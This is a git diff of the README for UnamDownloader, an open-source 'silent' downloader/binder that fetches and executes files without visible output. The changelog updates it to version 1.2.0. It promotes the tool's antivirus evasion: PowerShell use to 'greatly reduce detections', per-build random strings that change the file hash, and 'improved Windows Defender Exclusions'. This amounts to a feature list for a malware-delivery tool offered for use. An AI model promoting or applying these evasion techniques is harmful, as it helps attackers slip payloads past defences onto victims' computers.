@@ -1,16 +1,16 @@
 
 <img src="https://github.com/UnamSanctam/UnamDownloader/blob/master/UnamDownloader.png?raw=true">
 
-# UnamDownloader 1.1.1 - A free silent downloader
+# UnamDownloader 1.2.0 - A free silent downloader
 
 A free silent (hidden) open source downloader (binder) that can be built as either a native C or managed .NET C# file. A downloader is essentially the same as a binder although it downloads the files instead of storing them in memory.
 
 ## Main Features
 
-* Native (C) - Can choose to build the downloader as a native (C) file, basically no run requirements
-* Managed (C#) - Can choose to build the downloader as a managed (.NET C#) file, requires at least .NET 4.0
+* Native (C) - Can choose to build the downloader as a native (C) 32-bit file, basically no run requirements
+* Managed (C#) - Can choose to build the downloader as a managed (.NET C#) file, requires at least .NET Framework 4.0
 * Silent - Downloads and executes (if enabled) files without any visible output
-* Tiny - Final downloader build is usually less than 10kb
+* Tiny - Final downloader build is usually less than 10kb (depending on the amount of files to download)
 * Multiple files - Supports downloading any amount of files
 * Powershell - Does everything through powershell which currently greatly reduces detections
 * Compatible - Supports all tested Windows version (Windows 7 to Windows 10) and all file types
@@ -27,6 +27,10 @@ You can find the wiki [here](https://github.com/UnamSanctam/UnamDownloader/wiki)
 
 ## Changelog
 
+### v1.2.0 (21/08/2021)
+* Changed it to compile native into 32-bit programs for wider compatibility
+* Added random string into the native code to randomize file checksum/hash on each build
+* Optimized and improved Windows Defender Exclusions
 ### v1.1.1 (15/08/2021)
 * Fixed save bug when building native files to another directory than the builder location
 * Added the builder location as the standard save location to make it easier to navigate
